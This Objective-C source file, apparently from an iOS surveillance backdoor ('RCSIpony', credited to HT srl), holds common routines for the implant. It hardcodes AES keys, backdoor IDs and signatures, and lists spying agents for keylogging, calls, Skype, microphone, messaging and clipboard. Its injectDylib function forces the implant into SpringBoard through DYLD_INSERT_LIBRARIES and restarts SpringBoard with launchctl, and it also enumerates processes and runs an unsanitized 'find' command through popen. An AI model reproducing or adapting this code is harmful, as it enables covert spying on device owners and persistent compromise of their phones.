/*
 * RCSIpony - RCSICommon
 *  A common place for shit of (id) == (generalization FTW)
 *
 *
 * Created by Alfredo 'revenge' Pesoli on 08/09/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */
#import <Foundation/Foundation.h>
#import <CoreFoundation/CoreFoundation.h>
#import <CommonCrypto/CommonDigest.h>
#import <UIKit/UIDevice.h>
#import <sqlite3.h>

#import "NSMutableData+AES128.h"
#import "RCSIEncryption.h"
#import "RCSICommon.h"

//#define DEBUG_LOG
//#define DEBUG_TMP
//#define DEBUG


FILE *logFD = NULL;

#ifndef DEV_MODE
char  gLogAesKey[]      = "3j9WmmDgBqyU270FTid3719g64bP4s52"; // default
#else
char  gLogAesKey[]      = "9797DE1BD45444B171B9D6CCE6E0CB45"; // 11 Dubai
#endif

#ifndef DEV_MODE
char  gConfAesKey[]     = "Adf5V57gQtyi90wUhpb8Neg56756j87R"; // default
#else
char  gConfAesKey[]     = "2A61DC73B553402F804FB0D0036C632F"; // 11 Dubai
#endif

// Instance ID (20 bytes) unique per backdoor/user
char gInstanceID[]      = "37E63B54CDFB1EA1E99BCD5CD9A72DD00272BD75"; // generated

// Backdoor ID (16 bytes) (NULL terminated)
#ifndef DEV_MODE
char gBackdoorID[]      = "av3pVck1gb4eR2d8";
#else
char gBackdoorID[]      = "RCS_0000000011"; // 11 Dubai
#endif

// Challenge Key aka signature
#ifndef DEV_MODE
char gBackdoorSignature[]       = "f7Hk0f5usd04apdvqw13F5ed25soV5eD"; //default
#else
char gBackdoorSignature[]       = "MPMxXyD6fUfaWaIOia4X+koq7BtXXj3o"; // Dubai
#endif

// Configuration Filename encrypted within the first byte of gBackdoorSignature
char gConfName[]    = "c3mdX053du1YJ541vqWILrc4Ff71pViL";

BOOL gAgentCrisis   = NO;
BOOL gCameraActive  = NO;

NSString *gDylibName                = nil;
NSString *gBackdoorName             = nil;
NSString *gBackdoorUpdateName       = nil;
NSString *gConfigurationName        = nil;
NSString *gConfigurationUpdateName  = nil;
NSData   *gSessionKey               = nil;
int       gLockSock                 = -1;

// OS version
u_int gOSMajor  = 0;
u_int gOSMinor  = 0;
u_int gOSBugFix = 0;

u_int remoteAgents[8] = { OFFT_KEYLOG,
                          OFFT_VOICECALL,
                          OFFT_SKYPE,
                          OFFT_URL,
                          OFFT_MOUSE,
                          OFFT_MICROPHONE,
                          OFFT_IM,
                          OFFT_CLIPBOARD };

u_int gVersion      = 2012041501;

int getBSDProcessList (kinfo_proc **procList, size_t *procCount)
{
  int             err;
  kinfo_proc      *result;
  bool            done;
  static const int name[] = { CTL_KERN, KERN_PROC, KERN_PROC_ALL, 0 };
  size_t          length;
  
  // a valid pointer procList holder should be passed
  assert(procList != NULL);
  // But it should not be pre-allocated
  assert (*procList == NULL);
  // a valid pointer to procCount should be passed
  assert (procCount != NULL);
  
  *procCount = 0;
  
  result = NULL;
  done = false;
  
  do
    {
      assert (result == NULL);
      
      // Call sysctl with a NULL buffer to get proper length
      length = 0;
      err = sysctl ((int *)name, (sizeof (name) / sizeof (*name)) - 1, NULL, &length, NULL, 0);
      if (err == -1)
        err = errno;
      
      // Now, proper length is obtained
      if (err == 0)
        {
          result = (kinfo_proc *)malloc (length);
          if (result == NULL)
            err = ENOMEM;   // not allocated
        }
      
      if (err == 0)
        {
          err = sysctl ((int *)name, (sizeof (name) / sizeof (*name)) - 1, result, &length, NULL, 0);
          if (err == -1)
            err = errno;
          
          if (err == 0)
            done = true;
          else if (err == ENOMEM)
            {
              assert (result != NULL);
              free(result);
              result = NULL;
              err = 0;
            }
        }
    }
  while (err == 0 && !done);
  
  // Clean up and establish post condition  
  if (err != 0 && result != NULL)
    {
      free (result);
      result = NULL;
    }
  
  *procList = result; // will return the result as procList
  if (err == 0)
    *procCount = length / sizeof (kinfo_proc);
  
  assert ((err == 0) == (*procList != NULL ));
  
  return err;
}  

NSArray *obtainProcessList ()
{
  int i;
  kinfo_proc *allProcs = 0;
  size_t numProcs;
  NSString *procName;
  NSMutableArray *processList;
  
  int err =  getBSDProcessList (&allProcs, &numProcs);
  if (err)
    return nil;
  
  processList = [NSMutableArray arrayWithCapacity: numProcs];
  for (i = 0; i < numProcs; i++)
    {
      procName = [NSString stringWithFormat: @"%s", allProcs[i].kp_proc.p_comm];
#ifdef DEBUG
      NSLog(@"Process: %@", procName);
#endif
      [processList addObject: [procName lowercaseString]];
    }
  
  free (allProcs);
  return [processList autorelease];
}

BOOL findProcessWithName (NSString *aProcess)
{
  NSArray *processList;
  
  processList = obtainProcessList();
  [processList retain];
  
  for (NSString *currentProcess in processList)
    {
      //if (strcmp([currentProcess UTF8String], [[aProcess lowercaseString] UTF8String]) == 0)
      if (matchPattern([currentProcess UTF8String], [[aProcess lowercaseString] UTF8String]))
        return YES;
    }
  
  return NO;
}

BOOL isAddressOnLan (struct in_addr firstIp,
                     struct in_addr secondIp)
{
  struct ifaddrs *iface, *ifacesHead;
  
  //
  // Get Interfaces information
  //
  if (getifaddrs (&ifacesHead) == 0)
    {
      for (iface = ifacesHead; iface != NULL; iface = iface->ifa_next)
        { 
          if (iface->ifa_addr == NULL || iface->ifa_addr->sa_family != AF_INET)
            continue;
          
          if ( (firstIp.s_addr & ((struct sockaddr_in *)iface->ifa_netmask)->sin_addr.s_addr) ==
              (secondIp.s_addr & ((struct sockaddr_in *)iface->ifa_netmask)->sin_addr.s_addr) )
            {
              freeifaddrs (ifacesHead);
              return TRUE;
            }
        }
      freeifaddrs (ifacesHead);
    }
  else
    {
#ifdef DEBUG
      NSLog(@"Error while querying network interfaces");
#endif
    }
  
  return FALSE;
}

BOOL isAddressAlreadyDetected (NSString *ipAddress,
                               int aPort,
                               NSString *netMask,
                               NSMutableArray *ipDetectedList)
{
  NSEnumerator *enumerator = [ipDetectedList objectEnumerator];
  id anObject;
  
  while ((anObject = [enumerator nextObject]))
    { 
      if ([[anObject objectForKey: @"ip"] isEqualToString: ipAddress])
        {
          if ( (aPort == 0 ||
                [[anObject objectForKey: @"port"] intValue] == aPort) &&
               ([[anObject objectForKey: @"netmask"] isEqualToString: netMask]) )
            return TRUE;
        }
    }
  
  return FALSE;
}

BOOL compareIpAddress (struct in_addr firstIp,
                       struct in_addr secondIp,
                       u_long netMask)
{
  struct ifaddrs *iface, *ifacesHead;
  u_long ip1, ip2;
  
  //
  // Get Interfaces information
  //
  if (getifaddrs (&ifacesHead) == 0)
    {
      for (iface = ifacesHead; iface != NULL; iface = iface->ifa_next)
        { 
          if (iface->ifa_addr == NULL || iface->ifa_addr->sa_family != AF_INET)
            continue;
          
          ip1 = firstIp.s_addr & netMask;
          ip2 = secondIp.s_addr & netMask;
          
          if (ip1 == ip2)
            {
              freeifaddrs (ifacesHead);
              return TRUE;
            }
        }
      freeifaddrs (ifacesHead);
    }
  else
    {
#ifdef DEBUG
      NSLog(@"Error while querying network interfaces");
#endif
    }
    
  return FALSE;
}

NSString *getHostname ()
{
  NSProcessInfo *processInfo  = [NSProcessInfo processInfo];
  NSString *hostName          = [processInfo hostName];

  return hostName;
}

//
// Returns the serial number as a CFString.
// It is the caller's responsibility to release the returned CFString when done with it.
//
NSString *getSystemSerialNumber()
{

  NSString *id = [[UIDevice currentDevice] uniqueIdentifier];
  return id;
}

int matchPattern(const char *source, const char *pattern)
{
  for (;;)
    {
      if (!*pattern)
        return (!*source);
      
      if (*pattern == '*')
        {
          pattern++;
          
          if (!*pattern)
            return (1);
          
          if (*pattern != '?' && *pattern != '*')
            {
              for (; *source; source++)
                {
                if (*source == *pattern && matchPattern(source + 1, pattern + 1))
                  return (1);
                }
              
              return (0);
            }
          
          for (; *source; source++)
            {
              if (matchPattern(source, pattern))
                return (1);
            }
          
          return (0);
        }
      
      if (!*source)
        return (0);
      
      if (*pattern != '?' && *pattern != *source)
        return (0);
      
      source++;
      pattern++;
    }
}

NSArray *searchForProtoUpload(NSString *aFileMask)
{
  NSFileManager *_fileManager = [NSFileManager defaultManager];
  NSString *filePath          = [aFileMask stringByDeletingLastPathComponent];
  NSString *fileNameToMatch   = [aFileMask lastPathComponent];
  NSMutableArray *filesFound  = [[NSMutableArray alloc] init];
  
	BOOL isDir;
  int i;
  
	[_fileManager fileExistsAtPath: filePath
                     isDirectory: &isDir];
  
  if (isDir == TRUE)
    {
      NSArray *dirContent = [_fileManager contentsOfDirectoryAtPath: filePath
                                                              error: nil];
      
      int filesCount = [dirContent count];
      for (i = 0; i < filesCount; i++)
        {
          NSString *fileName = [dirContent objectAtIndex: i];
          
          if (matchPattern([fileName UTF8String],
                           [fileNameToMatch UTF8String]))
            {
              NSString *foundFilePath = [NSString stringWithFormat: @"%@/%@", filePath, fileName];
              [filesFound addObject: foundFilePath];
            }
        }
    }
  
  if ([filesFound count] > 0)
    {
      return [filesFound autorelease];
    }
  else
    {
      [filesFound release];
      
      return nil;
    }
}

NSArray *searchFile (NSString *aFileMask)
{
  FILE *fp;
  char path[1035];
  NSMutableArray *fileFound = [[NSMutableArray alloc] init];

#ifdef DEBUG
  NSLog(@"aFileMask: %@", [aFileMask dataUsingEncoding: NSUTF8StringEncoding]);
#endif
  
  NSString *commandString = [NSString stringWithFormat: @"/usr/bin/find %@", aFileMask];
  
  fp = popen ([commandString cStringUsingEncoding: NSUTF8StringEncoding], "r");
  
  if (fp == NULL)
    {
      printf("Failed to run command\n" );
      return nil;
    }
  
  while (fgets (path, sizeof (path) - 1, fp) != NULL)
    {
      NSString *tempPath = [[NSString stringWithCString: path
                                               encoding: NSUTF8StringEncoding]
                            stringByReplacingOccurrencesOfString: @"\n"
                                                      withString: @""];
#ifdef DEBUG
      NSLog(@"path: %@", tempPath);
#endif
      [fileFound addObject: tempPath ];
    }
#ifdef DEBUG
  NSLog(@"fileFound: %@", fileFound);
#endif
  pclose(fp);
  
  return fileFound;
}

#define RCS_PLIST     @"rcsiphone.plist"
#define RCS_PLIST_CLR @"rcsiphone_clr.plist"

NSMutableDictionary *openRcsPropertyFile()
{  
  NSMutableDictionary *retDict;
  NSString             *error = nil;
  NSPropertyListFormat format;
  int                  len;
  unsigned char        *buffer;
  NSRange              range;
  
  // Using the config aes key
#ifdef DEV_MODE
  unsigned char        dKey[CC_MD5_DIGEST_LENGTH];
  
  CC_MD5(gConfAesKey, strlen(gConfAesKey), dKey);
  NSData *keyData = [NSData dataWithBytes: dKey
                                   length: CC_MD5_DIGEST_LENGTH];
#else
  NSData *keyData = [NSData dataWithBytes: gConfAesKey
                                   length: CC_MD5_DIGEST_LENGTH];
#endif
  
  RCSIEncryption *rcsEnc = [[RCSIEncryption alloc] initWithKey: keyData];
  NSString *sFileName = [NSString stringWithString: [rcsEnc scrambleForward: RCS_PLIST seed: 1]];
  [rcsEnc release];
  
  NSString *pFilePath = [[NSBundle mainBundle] bundlePath];
  NSString *pFileName = [pFilePath stringByAppendingPathComponent: sFileName];
  
#ifdef DEBUG
  NSLog(@"openRcsPropertyFile: opening prop file %@", pFileName);
#endif 
  
  if (![[NSFileManager defaultManager] fileExistsAtPath: pFileName])
    return nil;
  
  // The enc plist
  NSData *pListData = [[NSFileManager defaultManager] contentsAtPath: pFileName];
  
  // Space for enc data
  NSMutableData *tempData = [[NSMutableData alloc] initWithLength: [pListData length] - sizeof(int)];
  buffer = (unsigned char *)[tempData bytes];
  
  // Extract the unpadded length
  range.location = sizeof(int);
  range.length   = [pListData length] - sizeof(int);
  [pListData getBytes: &len length: sizeof(int)];
  
  // Extract the prop list
  [pListData getBytes: (void *)buffer range: range];
  NSMutableData *ePropData = [NSMutableData dataWithBytes: buffer length: range.length];
  
  [tempData release];
  
  // Decrypt it
  if ([ePropData decryptWithKey: keyData] != kCCSuccess)
    {
      return nil;
    }
  // Save unpadded len bytes
  NSData *dPlistData = [NSData dataWithBytes: [ePropData bytes] length: len];
    
  // Create the plist dict
  retDict = (NSMutableDictionary *) [NSPropertyListSerialization propertyListFromData: dPlistData 
                                                                     mutabilityOption: NSPropertyListMutableContainers
                                                                               format: &format
                                                                     errorDescription: &error];
  return retDict;
}

id rcsPropertyWithName(NSString *name)
{ 
  id dict = nil;
  
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
  NSDictionary *temp = openRcsPropertyFile();  
  
  if (temp == nil)
    {
#ifdef DEBUG
      NSLog(@"rcsPropertyWithName: file do not exist!");
#endif 
      [pool release];
      return nil;
    }

#ifdef DEBUG
  NSLog(@"%s: plist %@", __FUNCTION__, temp);
#endif
  
  dict = (id)[[temp objectForKey: name] retain];
  
  [pool release];
  
  return dict;
}

BOOL setRcsPropertyWithName(NSString *name, NSDictionary *dictionary)
{
  NSString      *error = nil;
  NSRange       range;
  NSMutableData *propData;
  
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  // Try to open existing plist
  NSMutableDictionary *temp = openRcsPropertyFile();  
  
  if (temp == nil)
    {
      // No prop file: we setting the new dict
#ifdef DEBUG
      NSLog(@"setRcsPropertyWithName: prop file do not exist, create using current dictionary!");
#endif 
      temp = (NSMutableDictionary *) dictionary;
    }
  else 
    {
      if ([temp objectForKey: name] != nil)
        {
          // Replacing the new prop
          [temp removeObjectForKey: name];
          [temp setObject: [dictionary objectForKey: name] forKey: name];
        }
      else 
        {
          // Plist file is already created but not by the calling class
          // we add it
          //NSDictionary *addDict = [[NSDictionary alloc] initWithObjectsAndKeys: dictionary, name, nil];
          //[temp addEntriesFromDictionary: addDict];
          //[addDict release];
          [temp addEntriesFromDictionary: dictionary];
        }
    }

  // The clear form plist
  NSData *pListData = [NSPropertyListSerialization dataFromPropertyList: temp
                                                                 format: NSPropertyListXMLFormat_v1_0
                                                       errorDescription: &error];

  // Using conf aes key
#ifdef DEV_MODE
  unsigned char eKey[CC_MD5_DIGEST_LENGTH];
  CC_MD5(gConfAesKey, strlen(gConfAesKey), eKey);
  NSData *keyData = [NSData dataWithBytes: eKey
                                   length: CC_MD5_DIGEST_LENGTH];
#else
  NSData *keyData = [NSData dataWithBytes: gConfAesKey
                                   length: CC_MD5_DIGEST_LENGTH];
#endif
  
  // Scrambled name
  RCSIEncryption *rcsEnc = [[RCSIEncryption alloc] initWithKey: keyData];
  NSString *sFileName = [NSString stringWithString: [rcsEnc scrambleForward: RCS_PLIST seed: 1]];
  [rcsEnc release];

  NSString *pFilePath = [[NSBundle mainBundle] bundlePath];
  NSString *pFileName = [pFilePath stringByAppendingPathComponent: sFileName];

  // Unpadded length
  int len = [pListData length];

#ifdef DEBUG
  NSString *pFileName_clr = [pFilePath stringByAppendingPathComponent: RCS_PLIST_CLR];
  NSLog(@"setRcsPropertyWithName: create prop file clear in %@ (enc %@)", pFileName_clr, pFileName);
  [pListData writeToFile: pFileName_clr
              atomically: YES];
#endif 

  // Try the encryption
  if ([((NSMutableData *)pListData) encryptWithKey: keyData] == kCCSuccess)
    {
      // init the data with enc plist + (int)len
      propData = [[NSMutableData alloc] initWithCapacity: sizeof(int) + [pListData length]];
    
      // write down the unpadded len
      range.location = 0;
      range.length = sizeof(int);
      [propData replaceBytesInRange: range withBytes: (const void *) &len];
    
      // and the encrypted prop list 
      range.location = sizeof(int);
      range.length = [pListData length];
      [propData replaceBytesInRange: range withBytes: [pListData bytes]];

      [propData writeToFile: pFileName atomically: YES];
    }

  [propData release];
  
  [pool release];
  
  return YES;
}

BOOL injectDylib(NSString *sbPathname)
{
  //NSString *sbPathname = @"/System/Library/LaunchDaemons/com.apple.SpringBoard.plist";
  NSString *errorDesc = nil;
  NSString *dylibPathname = [[NSString alloc] initWithFormat: @"%@/%@", @"/usr/lib", gDylibName];
  
  NSData *sbData = [[NSFileManager defaultManager] contentsAtPath: sbPathname];
  
  if (sbData == nil)
    {
#ifdef DEBUG_TMP
      NSLog(@"%s: error on opening file %@", __FUNCTION__, sbPathname);
#endif
      return NO;
    }
  
  NSMutableDictionary *sbDict = 
  (NSMutableDictionary *)[NSPropertyListSerialization propertyListFromData: sbData 
                                                          mutabilityOption: NSPropertyListMutableContainersAndLeaves 
                                                                    format: nil  
                                                          errorDescription: &errorDesc];
  
  if (sbDict == nil)
    {
#ifdef DEBUG_TMP
      NSLog(@"%s: error on getting dictionary from file %@", __FUNCTION__, sbPathname);
#endif
      return NO;
    }
  
  NSDictionary *dylibDict  = [[NSDictionary alloc] initWithObjectsAndKeys: 
                              dylibPathname, @"DYLD_INSERT_LIBRARIES", nil];
  
  NSMutableDictionary *sbEnvDict = (NSMutableDictionary *)[sbDict objectForKey: @"EnvironmentVariables"];

#ifdef DEBUG_TMP
  NSLog(@"%s: DYLD_INSERT_LIBRARIES = %@", __FUNCTION__, dylibDict);
#endif 
  
  if (sbEnvDict == nil) 
    {
#ifdef DEBUG_TMP
      NSLog(@"%s: EnvironmentVariables not found create new entry", __FUNCTION__);
#endif
      // No entry...
      NSDictionary *envVarDict = [[NSDictionary alloc] initWithObjectsAndKeys: 
                                  dylibDict, @"EnvironmentVariables", nil];
      
      [sbDict addEntriesFromDictionary: envVarDict];
      
      [envVarDict release];
      
    }
  else 
    {
#ifdef DEBUG_TMP
      NSLog(@"%s: EnvironmentVariables entry found", __FUNCTION__);
#endif
      NSString *envObjOut = nil;
      NSString *envObjIn  = (NSString *) [sbEnvDict objectForKey: @"DYLD_INSERT_LIBRARIES"];
      
      if (envObjIn == nil) 
        {
#ifdef DEBUG_TMP
          NSLog(@"%s: DYLD_INSERT_LIBRARIES not found create new entry", __FUNCTION__, sbPathname);
#endif
          [sbEnvDict addEntriesFromDictionary: dylibDict];
        }
      else 
        {
#ifdef DEBUG_TMP
          NSLog(@"%s: DYLD_INSERT_LIBRARIES found %@", __FUNCTION__, envObjIn);
#endif
          NSRange sbRange;
          
          // Check if already present
          sbRange = [envObjIn rangeOfString: gDylibName options: NSCaseInsensitiveSearch];
        
          if (sbRange.location == NSNotFound)
            {
              envObjOut = [[NSString alloc] initWithFormat: @"%@:%@", envObjIn, dylibPathname];
        
              [sbEnvDict setObject: envObjOut forKey: @"DYLD_INSERT_LIBRARIES"];
        
#ifdef DEBUG_TMP
              NSLog(@"%s: DYLD_INSERT_LIBRARIES new entry = %@", 
                    __FUNCTION__, 
                    (NSString *) [sbEnvDict objectForKey: @"DYLD_INSERT_LIBRARIES"]);
#endif
            }
        }
      
      [envObjOut release];
    }
  
  [dylibDict release];
  
  NSData *sbDataOut = [NSPropertyListSerialization dataFromPropertyList: sbDict 
                                                                 format: NSPropertyListBinaryFormat_v1_0
                                                       errorDescription: &errorDesc];
  
  [sbDataOut writeToFile: sbPathname
              atomically: YES];
  [dylibPathname release];
  
  // Forcing a SpringBoard reload
  system("launchctl unload \"/System/Library/LaunchDaemons/com.apple.SpringBoard.plist\";" 
         "launchctl load \"/System/Library/LaunchDaemons/com.apple.SpringBoard.plist\"");
  
  return YES;
}

BOOL removeDylib(NSString *sbPathname)
{
  //NSString *sbPathname = @"/System/Library/LaunchDaemons/com.apple.SpringBoard.plist";
  NSString *dylibPathname = [[NSString alloc] initWithFormat: @"%@/%@", @"/usr/lib", gDylibName];
  NSString *errorDesc = nil;
  
  NSData *sbData = [[NSFileManager defaultManager] contentsAtPath: sbPathname];
  
  if (sbData == nil)
    {
#ifdef DEBUG_TMP
      NSLog(@"%s: error on opening file %@", __FUNCTION__, sbPathname);
#endif
      return NO;
    }
  
  NSMutableDictionary *sbDict = 
  (NSMutableDictionary *)[NSPropertyListSerialization propertyListFromData: sbData 
                                                          mutabilityOption: NSPropertyListMutableContainersAndLeaves 
                                                                    format: nil  
                                                          errorDescription: &errorDesc];
  
  if (sbDict == nil)
    {
#ifdef DEBUG_TMP
      NSLog(@"%s: error on getting dictionary from file %@", sbPathname);
#endif
      return NO;
    }
  
  NSMutableDictionary *sbEnvDict = (NSMutableDictionary *)[sbDict objectForKey: @"EnvironmentVariables"];
  
#ifdef DEBUG_TMP
  NSLog(@"%s: EnvironmentVariables found %@", __FUNCTION__, sbEnvDict);
#endif
  
  if (sbEnvDict != nil) 
    {
      NSMutableString *envObjOut = nil;
      NSString *envObjIn  = (NSString *)[sbEnvDict objectForKey: @"DYLD_INSERT_LIBRARIES"];
      
      if (envObjIn != nil) 
        {
#ifdef DEBUG_TMP
          NSLog(@"%s: DYLD_INSERT_LIBRARIES found %@", __FUNCTION__, envObjIn);
#endif     
          NSRange dlRange = [envObjIn rangeOfString: dylibPathname];
        
#ifdef DEBUG_TMP
          NSLog(@"%s: dylibPathname in range %d %d", __FUNCTION__, dlRange.location, dlRange.length);
#endif          
          if (dlRange.location != NSNotFound &&
              dlRange.length   != 0) 
            {
              // check if we're alone
              if ([envObjIn length] == [dylibPathname length])
                {
#ifdef DEBUG_TMP
                  NSLog(@"%s: envObjIn.length %d  dylibPathname length %d", 
                        __FUNCTION__, [envObjIn length], [dylibPathname length]);
#endif
                  // Yes alone remove the subdictionary
                  [sbDict removeObjectForKey: @"EnvironmentVariables"];
                }
              else 
                {
                  // delete the colon before or after...
                  if (dlRange.location != 0) 
                      dlRange.location--;
                
                  // remove the colon too
                  dlRange.length++;
                
#ifdef DEBUG_TMP
                  NSLog(@"%s: delete chars in range %d %d", 
                      __FUNCTION__, dlRange.location, dlRange.length);
#endif        
                  envObjOut = [[NSMutableString alloc] initWithString: envObjIn];
                  [envObjOut deleteCharactersInRange: dlRange];
                  [sbEnvDict setObject: envObjOut forKey: @"DYLD_INSERT_LIBRARIES"];
#ifdef DEBUG_TMP
                  NSLog(@"%s: new val %@", 
                        __FUNCTION__, envObjOut);
#endif 
                  [envObjOut release];
                }
            }
        }
    
      NSData *sbDataOut = [NSPropertyListSerialization dataFromPropertyList: sbDict 
                                                                     format: NSPropertyListBinaryFormat_v1_0 
                                                           errorDescription: &errorDesc];
      
      [sbDataOut writeToFile: sbPathname atomically: YES];
    }
  
  return YES;
}

void getSystemVersion(u_int *major,
                      u_int *minor,
                      u_int *bugFix)
{
  NSString *currSysVer = [[UIDevice currentDevice] systemVersion];

  if ([currSysVer rangeOfString: @"."].location != NSNotFound)
    {
      NSArray *versions = [currSysVer componentsSeparatedByString: @"."];

      if ([versions count] > 2)
        {
          *bugFix = (u_int)[[versions objectAtIndex: 2] intValue];
        }

      *major  = (u_int)[[versions objectAtIndex: 0] intValue];
      *minor  = (u_int)[[versions objectAtIndex: 1] intValue];
    }
  else
    {
#ifdef DEBUG
      NSLog(@"Error on sys ver (dot not found in string: %@)", currSysVer);
#endif
    }
}

NSMutableDictionary *
rcs_sqlite_get_row_dictionary(sqlite3_stmt *stmt)
{
  char field1[32];
  char field2[32];
  int i = 0;

  NSMutableDictionary *entry = [[NSMutableDictionary alloc] init];
  int cols = sqlite3_column_count(stmt);

  for (; i < cols; i++)
    {
      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
      strncpy(field1, (char *)sqlite3_column_name(stmt, i), 32);
      strncpy(field2, (char *)sqlite3_column_text(stmt, i), 32);

      NSString *colName = [[NSString alloc] initWithCString: field1
                                                   encoding: NSUTF8StringEncoding];
      NSString *colVal  = [[NSString alloc] initWithCString: field2
                                                   encoding: NSUTF8StringEncoding];

      [entry setObject: colVal
                forKey: colName];

      [colName release];
      [colVal release];
      [innerPool release];
    }

  return [entry autorelease];
}

NSMutableArray *
rcs_sqlite_do_select(sqlite3 *db, const char *stmt)
{
  int err;
  sqlite3_stmt *pStmt;

  sqlite3_prepare_v2(db, stmt, -1, &pStmt, 0); 
  NSMutableArray *results = [[NSMutableArray alloc] init];

  while ((err = sqlite3_step(pStmt)) == SQLITE_ROW)
    {
      NSMutableDictionary *entry = rcs_sqlite_get_row_dictionary(pStmt);
      [results addObject: entry];
    }

  if (err != SQLITE_DONE)
    {
#ifdef DEBUG
      NSLog(@"Error on select: %s" sqlite3_errmsg((sqlite3 *)&db));
#endif
      return nil;
    }

  sqlite3_finalize(pStmt);

  if ([results count] == 0)
    return nil;

  return [results autorelease];
}
